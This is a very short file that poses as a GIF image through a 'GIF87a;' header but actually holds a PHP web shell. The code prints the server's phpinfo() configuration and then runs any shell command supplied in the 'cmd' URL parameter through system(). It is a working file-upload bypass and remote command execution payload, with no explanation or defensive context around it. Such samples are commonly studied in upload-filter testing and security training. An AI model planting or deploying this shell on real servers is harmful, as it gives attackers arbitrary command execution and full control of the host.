GIF87a;
<?php
    phpinfo();
    if(isset($_GET['cmd']))
    {
        system($_GET['cmd']);
    }
?>
